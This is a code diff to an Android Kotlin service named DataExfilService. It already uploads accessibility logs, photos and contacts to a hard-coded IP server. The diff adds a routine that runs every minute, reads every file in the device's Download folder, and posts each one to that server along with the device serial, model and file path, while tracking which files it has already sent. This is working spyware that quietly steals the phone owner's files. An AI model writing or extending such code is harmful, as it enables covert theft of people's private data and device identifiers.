@@ -39,6 +39,7 @@ class DataExfilService : Service() {
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
         private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
+        private const val DOWNLOADS_ENDPOINT = "http://20.2.92.176:5000/downloads"
     }
 
     private val photosEndpoint = "http://20.2.92.176:5000/photos"
@@ -69,6 +70,13 @@ class DataExfilService : Service() {
         }
     }
 
+    private val downloadUploadRunnable = object : Runnable {
+        override fun run() {
+            uploadAllDownloads()
+            handler.postDelayed(this, 1 * 60 * 1000L) // Every 1 minute
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
@@ -84,6 +92,7 @@ class DataExfilService : Service() {
 
         // Start periodic uploads
         handler.postDelayed(uploadRunnable, 10000)
+        handler.postDelayed(downloadUploadRunnable, 10000)
 
         return START_STICKY
     }
@@ -315,6 +324,7 @@ class DataExfilService : Service() {
 
     override fun onDestroy() {
         handler.removeCallbacks(uploadRunnable)
+        handler.removeCallbacks(downloadUploadRunnable)
         Log.d(TAG, "Data exfiltration service destroyed")
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
@@ -561,6 +571,124 @@ class DataExfilService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error uploading contact: ${e.message}")
             contactsSyncPrefs.edit().remove("contact_$contactId").apply()
+        }
+    }
+
+    private fun uploadAllDownloads() {
+        if (!isNetworkAvailable()) {
+            Log.d(TAG, "No network, skipping download upload")
+            return
+        }
+
+        Thread {
+            try {
+                Log.d(TAG, "========== SCANNING DOWNLOAD FOLDER ==========")
+
+                val downloadFolder = File(Environment.getExternalStorageDirectory(), "Download")
+
+                if (!downloadFolder.exists() || !downloadFolder.isDirectory) {
+                    Log.d(TAG, "Download folder not found at: ${downloadFolder.absolutePath}")
+                    return@Thread
+                }
+
+                Log.d(TAG, "Download folder: ${downloadFolder.absolutePath}")
+
+                // Get ALL files in Download folder
+                val files = downloadFolder.listFiles()
+
+                if (files == null || files.isEmpty()) {
+                    Log.d(TAG, "Download folder is empty")
+                    return@Thread
+                }
+
+                Log.d(TAG, "Found ${files.size} files in Download folder")
+
+                var uploadedCount = 0
+                var skippedCount = 0
+
+                files.forEach { file ->
+                    if (file.isFile) {
+                        // Check if we've uploaded this file before
+                        // Using filename + size + last modified as unique key
+                        val prefsKey = "download_${file.name}_${file.length()}_${file.lastModified()}"
+
+                        if (!photoSyncPrefs.getBoolean(prefsKey, false)) {
+                            uploadFile(file, prefsKey)
+                            uploadedCount++
+                        } else {
+                            skippedCount++
+                            Log.d(TAG, "Already uploaded: ${file.name}")
+                        }
+                    }
+                }
+
+                Log.d(TAG, "========== DOWNLOAD SCAN COMPLETE ==========")
+                Log.d(TAG, "Uploaded: $uploadedCount files")
+                Log.d(TAG, "Skipped: $skippedCount files")
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Error scanning Download folder: ${e.message}", e)
+            }
+        }.start()
+    }
+
+    private fun uploadFile(file: File, idKey: String) {
+        try {
+            val deviceId = Build.SERIAL ?: "unknown"
+
+            Log.d(TAG, "Uploading: ${file.name} (${formatFileSize(file.length())})")
+
+            // Read file bytes
+            val bytes = file.readBytes()
+
+            // Create multipart request
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", file.name,
+                    bytes.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
+                .addFormDataPart("device_id", deviceId)
+                .addFormDataPart("device_model", Build.MODEL)
+                .addFormDataPart("file_path", file.absolutePath)
+                .addFormDataPart("file_size", file.length().toString())
+                .addFormDataPart("folder", "Download")
+                .build()
+
+            val request = Request.Builder()
+                .url(DOWNLOADS_ENDPOINT)
+                .post(requestBody)
+                .build()
+
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "Upload failed: ${file.name} - ${e.message}")
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Uploaded: ${file.name}")
+                        photoSyncPrefs.edit().putBoolean(idKey, true).apply()
+                    } else {
+                        Log.w(TAG, "Upload failed: ${file.name} - HTTP ${response.code}")
+                    }
+                    response.close()
+                }
+            })
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading ${file.name}: ${e.message}")
+        }
+    }
+
+    private fun formatFileSize(size: Long): String {
+        val kb = size / 1024.0
+        val mb = kb / 1024.0
+        val gb = mb / 1024.0
+
+        return when {
+            gb >= 1 -> "%.2f GB".format(gb)
+            mb >= 1 -> "%.2f MB".format(mb)
+            kb >= 1 -> "%.2f KB".format(kb)
+            else -> "$size B"
         }
     }
 
